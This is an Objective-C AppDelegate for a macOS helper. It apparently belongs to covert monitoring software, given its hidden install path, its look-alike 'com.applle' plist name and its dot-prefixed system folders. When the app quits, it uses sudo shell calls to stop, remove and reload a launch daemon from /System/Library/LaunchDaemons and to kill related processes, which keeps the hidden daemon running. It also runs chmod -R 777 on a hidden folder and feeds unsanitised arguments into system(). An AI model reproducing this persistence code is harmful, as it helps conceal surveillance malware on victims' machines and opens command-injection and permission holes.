#import "AppDelegate.h"

#import "DebugStatus.h"

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)note {
    #pragma unused (note)
}

- (void)applicationWillTerminate:(NSNotification *)note {
    #pragma unused (note)
    
    /*
     No need to wait, otherwise system will kill this app before this method completed execution, tested on 10.10.2, 10.9.1
     */
    //[NSThread sleepForTimeInterval:5];
    
    NSArray *args = [[NSProcessInfo processInfo] arguments];
    
    /*
     - args0: /Library/PrivilegedHelperTools/.blbla/blbla/Contents/MacOS/blbla
     - args1: com.applle.blbld.plist
     - args2: blblu
     - args3: blbld
     */
    
    DLog(@"args = %@", args);
    
    NSString* charCmd = [NSString stringWithFormat:@"sudo launchctl stop %@",[args objectAtIndex:1]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo launchctl remove %@",[args objectAtIndex:1]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo killall %@",[args objectAtIndex:3]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo killall %@",[args objectAtIndex:2]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo launchctl load /System/Library/LaunchDaemons/%@",[args objectAtIndex:1]];
    system([charCmd UTF8String]);
    
    charCmd = [NSString stringWithFormat:@"sudo chmod -R 777 /var/.lsalcore/"];
    system([charCmd UTF8String]);
    
}

@end
